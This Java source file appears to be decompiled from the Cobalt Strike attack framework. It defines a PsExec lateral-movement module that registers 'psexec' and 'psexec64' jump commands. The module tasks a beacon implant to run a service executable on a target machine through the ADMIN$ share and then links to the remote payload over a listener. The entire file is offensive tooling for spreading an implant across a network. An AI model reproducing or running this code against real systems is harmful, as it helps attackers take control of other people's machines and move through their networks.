package beacon.remoteexploits;

import aggressor.AggressorClient;
import aggressor.DataUtils;
import beacon.BeaconRemoteExploits;
import beacon.TaskBeacon;
import common.ListenerUtils;
import common.ScListener;

public class PsExec implements BeaconRemoteExploits.RemoteExploit {
    protected String arch;

    protected AggressorClient client;

    public PsExec(AggressorClient aggressorClient, String string) {
        this.client = aggressorClient;
        this.arch = string;
        if ("x86".equals(string)) {
            DataUtils.getBeaconRemoteExploits(aggressorClient.getData()).register("psexec", string, "Use a service to run a Service EXE artifact", this);
        } else {
            DataUtils.getBeaconRemoteExploits(aggressorClient.getData()).register("psexec64", string, "Use a service to run a Service EXE artifact", this);
        }
    }

    public void jump(String string1, String string2, String string3) {
        ScListener scListener = ListenerUtils.getListener(this.client, string3);
        TaskBeacon taskBeacon = new TaskBeacon(this.client, new String[]{string1});
        taskBeacon.PsExec(string1, string2, this.arch, scListener, "ADMIN$");
        taskBeacon.linkToPayloadRemote(scListener, string2);
    }
}
